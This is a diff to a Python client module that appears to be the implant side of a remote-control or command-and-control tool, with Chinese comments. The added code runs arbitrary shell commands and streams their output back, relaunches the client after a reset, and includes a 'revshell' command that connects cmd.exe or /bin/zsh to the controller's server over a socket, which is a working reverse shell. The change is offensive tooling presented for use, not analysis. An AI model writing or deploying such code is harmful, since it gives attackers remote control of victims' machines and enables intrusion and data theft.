@@ -1,16 +1,32 @@
 import contextlib
 import inspect
 import io
+import locale
 import os
+import socket
 import subprocess
+import sys
+import threading
+import time
 
+from client.config.config import SERVER_ADDR
 from client.util.CommandBase import CommandBase
 from client.util.decorator import desc
-from common.util import format_dict
+from common.util import format_dict, logger
 
 
 class CommonCommands(CommandBase):
     """所有平台通用的命令"""
+
+    def read_stream(self, stream):
+        while True:
+            # 从输入流读取一行数据
+            line = stream.readline()
+            # 如果没有更多数据可读取，则跳出循环
+            if not line:
+                break
+            # 将读取的字节转换为字符串，并去除行尾的换行符
+            self.send_interim_result(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'))
 
     @desc('change directory')
     def cd(self, path):
@@ -40,6 +56,21 @@ class CommonCommands(CommandBase):
                 return 0, result.stderr
         except Exception as e:
             return 0, str(e)
+
+    @desc('execute shell command and read from streams in parallel')
+    def read(self, command):
+        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                               stdin=subprocess.DEVNULL)
+        stdout_thread = threading.Thread(target=self.read_stream, args=(cmd.stdout,))
+        stderr_thread = threading.Thread(target=self.read_stream, args=(cmd.stderr,))
+        stdout_thread.daemon = True
+        stderr_thread.daemon = True
+        stdout_thread.start()
+        stderr_thread.start()
+        # 等待命令完成
+        cmd.wait()
+        time.sleep(0.1)
+        self.send_final_result(1, "Command completed successfully")
 
     @desc('download file')
     def download(self, filename):
@@ -89,3 +120,58 @@ class CommonCommands(CommandBase):
             return 0, f'File does not exist: {zip_name}'
         shutil.unpack_archive(zip_name, os.getcwd())
         return 1, f'Archive extracted to {os.getcwd()}'
+
+    @desc('close connection')
+    def kill(self):
+        self.socket.close()
+        sys.exit(0)
+
+    @desc('reset connection')
+    def reset(self):
+        if os.name == 'nt':
+            from client.util.win32util import get_executable_path
+            exec_path = get_executable_path()
+            subprocess.Popen(exec_path)
+        elif os.name == 'posix':
+            executable = os.path.realpath(sys.executable)
+            argv = os.path.realpath(''.join(sys.argv))
+            exec_path = f'{executable} {argv}'
+            subprocess.Popen(exec_path, shell=True)
+        self.socket.close()
+        sys.exit(0)
+
+    @desc('start a interactive reverse shell')
+    def revshell(self, arg):
+
+        interpreter = None
+        if os.name == 'nt':
+            interpreter = 'cmd.exe'
+        elif os.name == 'posix':
+            interpreter = '/bin/zsh'
+        if not interpreter:
+            self.send_final_result(0, 'Interpreter not found', 1)
+
+        self.send_final_result(1, 'Reverse shell thread being started', 1)
+
+        p = subprocess.Popen(interpreter, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+
+        s = socket.socket()
+        s.connect((SERVER_ADDR[0], int(arg.strip())))
+
+        def send():
+            while p.poll() is None:
+                o = os.read(p.stdout.fileno(), 1024)
+                s.send(o)
+            logger.info('Sending thread has been terminated')
+            s.close()
+
+        def recv():
+            try:
+                while 1:
+                    i = s.recv(1024)
+                    os.write(p.stdin.fileno(), i)
+            finally:
+                logger.info('Receiving thread has been terminated')
+
+        threading.Thread(target=send, daemon=True).start()
+        threading.Thread(target=recv).start()
